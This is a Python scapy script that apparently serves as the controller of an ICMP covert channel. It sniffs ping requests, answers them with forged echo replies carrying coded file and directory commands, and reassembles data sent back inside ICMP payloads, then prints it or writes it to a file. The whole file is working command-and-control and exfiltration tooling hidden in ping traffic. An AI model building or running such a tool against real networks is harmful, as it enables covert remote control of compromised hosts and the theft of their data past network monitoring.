from scapy.all import *
from scapy.layers.inet import ICMP, IP

MAX_DATA_SIZE = 1472
ASK_FOR_COMMAND_ID = 220
START_TRANSMISSION_ID = 240
ONGOING_TRANSMISSION_ID = 250
END_TRANSMISSION_ID = 255


def write_string_to_file(filemane, message):
    text_file = open(filemane, "w")
    n = text_file.write(message)
    text_file.close()


def stop_fnc(packet):
    if packet[ICMP] and packet[ICMP].id == END_TRANSMISSION_ID:
        return True
    else:
        return False


def storage_file(pkts, filename):
    message = ""
    pkts = pkts[1:len(pkts) - 1]
    for packet in pkts:
        message += packet[ICMP].payload.load.decode("utf-8")
    write_string_to_file(filename, message)


def display_cmd(pkts):
    message = ""
    pkts = pkts[1:len(pkts) - 1]
    for packet in pkts:
        message += packet[ICMP].payload.load.decode("utf-8")
    print(message)


def forged_reply(pkt, action):
    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                  ICMP(type=0, code=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / \
                  Raw(load=action)
    send(spoofed_pkt, verbose=False)


def default_reply(pkt):
    spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                  ICMP(type=0, code=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
    send(spoofed_pkt, verbose=False)


def spoof_ping_reply(pkt):
    action = ["200 ./data.txt", "500 data.txt", "400 ./", "300 ./data1.txt", "200 ./data.txt"]
    if not hasattr(spoof_ping_reply, "cpt"):
        spoof_ping_reply.cpt = 0
    if not hasattr(spoof_ping_reply, "messages_packets"):
        spoof_ping_reply.messages_packets = []

    # pkt[ICMP].id = 220
    if ICMP in pkt and pkt[ICMP].type == 8:
        if pkt[ICMP].id == ASK_FOR_COMMAND_ID:
            print("Action")
            forged_reply(pkt, action[spoof_ping_reply.cpt])
            spoof_ping_reply.cpt = (spoof_ping_reply.cpt + 1) % len(action)
            print(spoof_ping_reply.cpt)
        elif pkt[ICMP].id == START_TRANSMISSION_ID \
                or pkt[ICMP].id == ONGOING_TRANSMISSION_ID:
            print("Data")
            spoof_ping_reply.messages_packets.append(pkt)
        elif pkt[ICMP].id == END_TRANSMISSION_ID:
            print("Data end")
            spoof_ping_reply.messages_packets.append(pkt)
            display_cmd(spoof_ping_reply.messages_packets)
            spoof_ping_reply.messages_packets = []
        else:
            print("Normal ping request detected")
            # default_reply(pkt)


if __name__ == '__main__':
    print("Waiting ping")
    messages_packets = []
    sniff(filter="icmp", prn=spoof_ping_reply)
